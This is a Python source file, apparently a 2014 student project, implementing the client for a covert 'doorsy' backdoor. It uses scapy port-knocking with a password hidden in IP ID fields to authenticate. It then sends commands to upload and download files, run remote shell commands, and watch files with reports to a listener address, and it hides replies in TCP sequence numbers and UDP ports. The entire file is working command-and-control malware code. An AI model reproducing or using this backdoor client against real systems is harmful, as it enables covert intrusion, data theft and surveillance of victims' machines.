'''
--------------------------------------------------------------------------------------------
-- SCRIPT: doorsy-client.py
-- 
-- FUNCTIONS: main
--            sendKnock
--            checkAutenticate
--            sendCommand
--            sendFile
--            getFile
--            terminal
--            notify
--            kill
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- NOTES: Client script for doorsy backdoor server
-- 
---------------------------------------------------------------------------------------------
'''
from scapy.all import *
from encrypt import *
import os
import random
import time

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: main()
-- 
-- RETURNS: void
-- 
-- NOTES: Sets user parameters and starts up the knock sequence.
-- 
---------------------------------------------------------------------------------------------
'''
protocol = "tcp"
rport = 0
def main():
	global protocol
	global rport
	address = "192.168.0.11"
	port = 80
	password = ""
	knock = [1,2,3,5]
	warnings = ""

	# Making sure we're running in root
	if os.geteuid() != 0:
		print "Program must be run as root"
		return

	while True:
		os.system("clear")
		print warnings
		warnings = ""

		print "Protocol:  " + protocol
		print "Server Address:  " + address
		print "Port: " + str(port)
		print "Reset Port: " + str(rport)
		print "Password:        " + password
		print "Knock Sequence:  " + str(knock)
		print " "
		print "-Commands-"
		print "C - Communication Protocol (tcp/udp)"
		print "A - change server address"
		print "D - change command port"
		print "S - change reset port"
		print "P - change password"
		print "K - change knock sequence"
		print "R - Run Connection Sequence"
		print "Q - Exit program"
		print "Input Command: "

		choice = raw_input()
		if choice == 'C' or choice == 'c':
			print "Input the transport-later protocol to use: "
			proto = raw_input()
			if proto.lower() == "tcp" or proto.lower() == "udp":
				protocol = proto.lower()
			else:
				warnings = warnings + "Supported protocols include tcp and UDP\n"
		elif choice == 'A' or choice == 'a':
			print "Input new server address: "
			address = raw_input()
		elif choice == 'D' or choice == 'd':
			print "Input new Port: "
			port = raw_input()
		elif choice == 'S' or choice == 's':
			print "Input new reset Port (a negative number will disable this): "
			port = raw_input()
		elif choice == 'P' or choice == 'p':
			print "Input new Password: "
			password = raw_input()
		elif choice == 'K' or choice == 'k':
			print "Input new Port Knock sequence."
			print "Each port number should be comma deliminated: "
			ports = raw_input()
			knock[:] = []
			for port in ports.split(","):
				knock.append(int(port))
		elif choice == 'R' or choice == 'r':
			# Making sure we have at least 1 password or knock.
			# We need either a password or a knock in order for remote access to work
			if len(password) < 1 and len(knock) < 1:
				warnings = warnings + "Must have a password or knock sequence to connect to a server\n"
			else:
				try:
					sendKnock(address, port, password, knock)
					if checkAuthenticate(address, port):
						sendCommand(address, port)
				except KeyboardInterrupt:
					print "Shutting Down"
				continue
		elif choice == 'Q' or choice == "q":
			return
		else:
			warnings = warnings + "Invalid input\n"
		print "\n"

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendKnock
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendKnock(address, commandPort, password, knock)
--              address - The address of the server
--              commandPort - The port to which you want to send commands
--              password - The password, if any, which will be used to autheticate to the server
--              knock - The knock sequence, if any, which will be used to autheticate to the server
-- 
-- RETURNS: Returns true on successful connection, otherwise False
-- 
-- NOTES: Sends the knock sequence to the server
-- 
---------------------------------------------------------------------------------------------
'''
def sendKnock(address, commandPort, password, knock):
	seq = random.randint(0, 16777215)
	idpass = random.randint(0, 127)
	if rport >= 0:
		knock = [rport] + knock

	if len(knock) < 1:
		for c in password:
			port = random.randint(0, 65535)
			if protocol == "tcp":
				knockPacket = IP(dst=address, id=(idpass<<8) + ord(c))/\
				              TCP(sport=commandPort, dport=port, seq=seq)
				seq += 1
				idpass += 1
				send(knockPacket, verbose=0)
			elif protocol == "udp":
				knockPacket = IP(dst=address, id=(idpass<<8) + ord(c))/\
				              UDP(sport=commandPort, dport=port)
				idpass += 1
				send(knockPacket, verbose=0)
	else:
		ipid = random.randint(0, 65535)
		c = 0
		for port in knock:
			ipHead = IP(dst=address)
			if len(password) > 0 and c < len(password):
				ipHead.id = (idpass<<8) + ord(password[c])
				c += 1
				idpass += 1
				ipid = ipHead.id
			else:
				ipHead.id = ipid
				ipid += 1
			if protocol == "tcp":
				knockPacket = ipHead/\
				              TCP(sport=commandPort, dport=port, seq=seq)
				seq += 1
				send(knockPacket, verbose=0)
			elif protocol == "udp":
				knockPacket = ipHead/\
				              UDP(sport=commandPort, dport=port)
				send(knockPacket, verbose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: checkAuthenticate
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: checkAuthenticate(address, port)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: Returns true on auth packet received, otherwise false
-- 
-- NOTES: Checks for a response packet from the server to varify a successful connection.
-- 
---------------------------------------------------------------------------------------------
'''
def checkAuthenticate(address, port):
	while True:
		packetFilter = protocol + " and ip src " + address
		packets = sniff(filter=packetFilter, count=1, timeout=30)
		
		if len(packets) == 0:
			return False
		else:
			#if protocol == "tcp":
			#	port = packets[0][TCP].sport
			#elif protocol == "udp":
			#	port = packets[0][UDP].sport
			return True

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendCommand
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendCommand(address, port)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: Queries the user for a command to send to the server and then starts up the
--        appropriate command function.
---------------------------------------------------------------------------------------------
'''
def sendCommand(address, port):
	warnings = ""
	while True:
		print "\n\n"
		print warnings
		warnings = ""

		print "Connected to " + address
		print "-Server Commands-"
		print "U - Upload file"
		print "D - Download file"
		print "T - Terminal Command"
		print "I - iNotify"
		print "K - Kill Server*"
		print "Note: These actions will terminate the client's connection to the server"
		print "Input Command: "

		choice = raw_input()
		if choice == 'U' or choice == 'u':
			print "Input file to upload: "
			sFile = raw_input()
			sendFile(address, port, sFile)
		elif choice == 'D' or choice == 'd':
			print "Input file to download: "
			gFile = raw_input()
			getFile(address, port, gFile)
		elif choice == 'T' or choice == 't':
			print "Input terminal command: "
			command = raw_input()
			terminal(address, port, command)
		elif choice == 'I' or choice == 'i':
			print "Input file or directory to be watched: "
			notice = raw_input()
			print "Input IP address of listening server which should receive iNotify results: "
			listener = raw_input()
			notify(address, port, notice, listener)
		elif choice == 'K' or choice == 'k':
			print "Terminating Server..."
			kill(address, port)
			return
		else:
			warnings = warnings + "Invalid input\n"
		print "\n"

# --Server Codes--
#       A S F 
#       C Y I 
#       K N N Flag
# sFile 0 0 0 N/A
# gFile 1 0 0 A
# termi 0 1 0 S
# iNoti 1 1 0 AS
# Kill  0 0 1 F

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendFile
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendFile(address, port, sFile)
--              address - The address of the server
--              port - The port to which packets should be sent
--              sFile - The directory and file to be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: Sends a file to the server from the client
-- 
---------------------------------------------------------------------------------------------
'''
def sendFile(address, port, sFile):
	if protocol == "tcp":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags=0 + 32)/\
			            Raw(load=encrypt(sFile.split("/")[len(sFile.split("/"))-1]))
		send(commandPacket, verbose=0)
		try:
			with open(sFile, "r") as tFile:
				for line in tFile:
					time.sleep(0.1)
					commandPacket[IP].id = commandPacket[IP].id + 1
					commandPacket[TCP].seq = commandPacket[TCP].seq + 1
					commandPacket[Raw].load = encrypt(line)
					send(commandPacket, verbose=0)
		except IOError:
			print "No such file"
		commandPacket[IP].id = commandPacket[IP].id + 1
		commandPacket[TCP].seq = commandPacket[TCP].seq + 1
		commandPacket[Raw].load = ""
		commandPacket[TCP].flags="F"
	elif protocol == "udp":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            UDP(sport=(random.randint(0, 255)<<8) + 1, dport=port)/\
			            Raw(load=encrypt(sFile))
		send(commandPacket, verbose=0)
		try:
			with open(sFile, "r") as tFile:
				for line in tFile:
					commandPacket[IP].id = commandPacket[IP].id + 1
					commandPacket[Raw].load = encrypt(line)
					send(commandPacket, verbose=0)
		except IOError:
			print "No such file"
		commandPacket[IP].id = commandPacket[IP].id + 1
		commandPacket[Raw].load = ""
		commandPacket[UDP].sport = 0
	send(commandPacket, verbose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: getFile
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: getFile(address, port, gFile)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: receives a file from the server
-- 
---------------------------------------------------------------------------------------------
'''
def getFile(address, port, gFile):
	if protocol == "tcp":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags=16 + 32)/\
			            Raw(load=encrypt(gFile))
	elif protocol == "udp":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            UDP(sport=(random.randint(0, 255)<<8) + 2, dport=port)/\
			            Raw(load=encrypt(gFile))
	send(commandPacket, verbose=0)

	with open(gFile.split("/")[len(gFile.split("/"))-1], "w") as tFile:
		while True:
			dPacket = sniff(filter=protocol + " src port " + str(port) + " and ip src " + address, count=1, timeout=30)
			if len(dPacket) == 0:
				break
			if dPacket[0].haslayer(TCP) == True:
				if dPacket[0][TCP].flags == 1:
					break
			elif dPacket[0].haslayer(UDP) == True:
				if dPacket[0][UDP].sport == 0:
					break
			else:
				continue
			if dPacket[0].haslayer(Raw) != True:
				continue
			tFile.write(encrypt(dPacket[0][Raw].load))
'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: terminal
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: terminal(address, port, command)
--              address - The address of the server
--              port - The port to which packets should be sent
--              command - The terminal command which should be run
-- 
-- RETURNS: N/A
-- 
-- NOTES: Sends a terminal command and receives the results of that command.
-- 
---------------------------------------------------------------------------------------------
'''
def terminal(address, port, command):
	result = ""
	if protocol == "tcp":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags=2 + 32)/\
			            Raw(load=encrypt(command))
		send(commandPacket, verbose=0)
	
		while True:
			dPacket = sniff(filter="tcp and src port " + str(port) + " and ip src " + address, count=1, timeout=30)
			if len(dPacket) == 0:
				break
			if dPacket[0].haslayer(TCP) != True:
				continue
			if dPacket[0][TCP].flags == 1:
				break
			result = result + chr(0x000000FF&(dPacket[0][TCP].seq>>24))
			result = result + chr(0x000000FF&(dPacket[0][TCP].seq>>16))
			result = result + chr(0x000000FF&(dPacket[0][TCP].seq>>8))
			result = result + chr(0x000000FF&(dPacket[0][TCP].seq))
	elif protocol == "udp":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            UDP(sport=(random.randint(0, 255)<<8) + 4, dport=port)/\
			            Raw(load=encrypt(command))
		send(commandPacket, verbose=0)
	
		while True:
			dPacket = sniff(filter="udp and src port " + str(port) + " and ip src " + address, count=1, timeout=30)
			if len(dPacket) == 0:
				break
			if dPacket[0].haslayer(UDP) != True:
				continue
			if dPacket[0][UDP].dport == 0:
				break
			result = result + chr(0x00FF&(dPacket[0][UDP].dport>>8))
			result = result + chr(0x00FF&(dPacket[0][UDP].dport))

		result = encrypt(result)

	print encrypt(result)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: notify
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: notify(address, port, notice, listener)
--              address - The address of the server
--              port - The port to which packets should be sent
--              notice - The file or directory which should be monitored
--              listener - Address of the listening server
-- 
-- RETURNS: N/A
-- 
-- NOTES: Specifies a directory or file which should be watched by the server as well as
--        the ip address of the listener to which changes should be reported.
---------------------------------------------------------------------------------------------
'''
def notify(address, port, notice, listener):
	if protocol == "tcp":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags=18 + 32)/\
			            Raw(load=encrypt(notice + "\n" + listener))
	elif protocol == "udp":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            UDP(sport=(random.randint(0, 255)<<8) + 8, dport=port)/\
			            Raw(load=encrypt(notice + "\n" + listener))
	send(commandPacket, verbose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: kill
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: kill(address, port)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: Terminates the connection between the client and server.
-- 
---------------------------------------------------------------------------------------------
'''
def kill(address, port):
	if protocol == "tcp":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags=1 + 32)
	elif protocol == "udp":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            UDP(sport=(random.randint(0, 255)<<8) + 16, dport=port)
	send(commandPacket, verbose=0)

main()

